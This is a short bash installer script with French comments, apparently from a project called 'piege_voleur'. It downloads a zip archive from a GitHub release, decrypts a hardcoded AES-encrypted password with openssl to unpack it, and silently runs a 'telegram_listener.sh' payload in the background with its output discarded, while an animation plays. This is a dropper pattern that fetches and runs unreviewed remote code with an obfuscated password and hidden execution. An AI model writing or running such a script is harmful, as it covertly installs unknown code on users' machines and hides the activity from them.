#!/bin/bash

# Fonction pour afficher une animation géniale
function show_animation() {
    local msg="Thx to TRHACKNON"
    local len=${#msg}
    for (( i=0; i<$len; i++ )); do
        echo -n "${msg:$i:1}"
        sleep 0.1
    done
    echo
    for i in $(seq 1 5); do
        echo -n "."
        sleep 0.5
    done
    echo -e "\nAnimation complétée !"
}

# Téléchargement du fichier zip
echo "Téléchargement de l'archive depuis GitHub..."
wget -q https://github.com/trh4ckn0n/piege_voleur/releases/download/V2/piegep.zip -O /tmp/piege.zip

# Vérification du téléchargement
if [ ! -f /tmp/piege.zip ]; then
    echo "Erreur: téléchargement échoué"
    exit 1
fi

# Décompression de l'archive
echo "Décompression de l'archive..."
# Mot de passe chiffré en base64 (résultat de l'encodage AES)
encrypted_password="U2FsdGVkX1/WZ/0duU6igJg7oukcsrN8vQG63NphPjo="

# Décryptage du mot de passe
password=$(echo "$encrypted_password" | openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -pass pass:"trhacknon")

# Utilisation du mot de passe pour décompresser l'archive
unzip -P "$password" -q /tmp/piege.zip -d /tmp/piege_voleur-trkn

# Vérifier si le fichier est bien décompressé
if [ ! -d /tmp/piege_voleur-trkn ]; then
    echo "Erreur: décompression échouée"
    exit 1
fi

# Exécution de l'installation en arrière-plan
echo "Exécution de l'installation..."
nohup /tmp/piege_voleur-trkn/telegram_listener.sh &>/dev/null &

# Afficher une animation pendant que l'installation se fait
show_animation

# Fin du script
echo "Installation en cours en arrière-plan. Veuillez patienter."
